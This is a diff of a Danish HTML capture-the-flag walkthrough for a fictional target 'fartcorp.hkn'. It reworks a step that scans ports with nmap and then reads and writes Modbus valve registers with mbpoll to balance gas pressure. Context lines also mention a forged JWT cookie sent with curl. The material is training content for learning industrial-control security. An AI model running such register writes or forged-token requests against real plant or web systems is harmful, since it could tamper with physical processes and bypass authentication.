@@ -49,11 +49,17 @@ curl -b "jwt=&lt;forged&gt;" http://fartcorp.hkn/   # flag + ny rute /gasgrid</c
              Valvene styres via Modbus holding-registre:</p>
              <pre><code><span class="gloss" tabindex="0" data-tip="Netværksscanner: finder åbne porte og services på en host.">nmap</span> -p- fartcorp.hkn                 # 80 + 502/mbap
 <span class="gloss" tabindex="0" data-tip="Kommandolinje-værktøj til at læse/skrive Modbus-registre uden eget script.">mbpoll</span> -m tcp -a 1 -t 4 -r 1 -c 5 -1 fartcorp.hkn      # læs de 5 valve-vinkler (holding-regs r1..r5)</code></pre>
-             <p>Kortlæg modellen ved at skrive værdier og aflæse WebSocket-staten (<code>ws://host/ws</code>):
-             <strong>r1</strong> = afbrændings-station (luk = <code>0</code>), <strong>r2</strong> = outlet til verden
-             (åbn = <code>330</code>), og <strong>r3/r4/r5</strong> = tre gaskilder hvor
-             <code>worldPressure = r3+r4+r5</code>. Alle tre helt åbne (3×330 = 990) → <code>danger:true</code> = BOOM.
-             Kunderne betalte for <strong>825</strong>, så fordel det: 825 / 3 = <strong>275</strong> pr. kilde.</p>
+             <p>Kortlæg hvad hvert register gør ved at skrive ét ad gangen og aflæse WebSocket-staten
+             (<code>ws://host/ws</code>), som rapporterer <code>worldPressure</code>, <code>danger</code> og
+             kundernes efterspørgsel:</p>
+             <pre><code># skriv r3 og se worldPressure ændre sig i ws-staten:
+mbpoll -m tcp -a 1 -t 4 -r 3 -1 fartcorp.hkn 100     # worldPressure stiger med 100</code></pre>
+             <p>Fra den kortlægning: <strong>r1</strong> = afbrændings-station (luk = <code>0</code>),
+             <strong>r2</strong> = outlet til verden (åbn = <code>330</code>, registrenes max), og
+             <strong>r3/r4/r5</strong> = tre gaskilder hvor <code>worldPressure = r3+r4+r5</code>. Alle tre
+             på max (3×330 = 990) giver <code>danger:true</code> = BOOM. WS-staten oplyser at kunderne
+             efterspørger <strong>825</strong>, så fordel det jævnt: 825 / 3 = <strong>275</strong> pr.
+             kilde.</p>
              <pre><code>mbpoll -m tcp -a 1 -t 4 -r 1 fartcorp.hkn 0 330 275 275 275   # r1=0 <span class="gloss" tabindex="0" data-tip="Kommandoen for radare2: reverse-engineering-værktøj til binær analyse.">r2</span>=330 r3=r4=r5=275 -> 825, danger=false</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <ul>
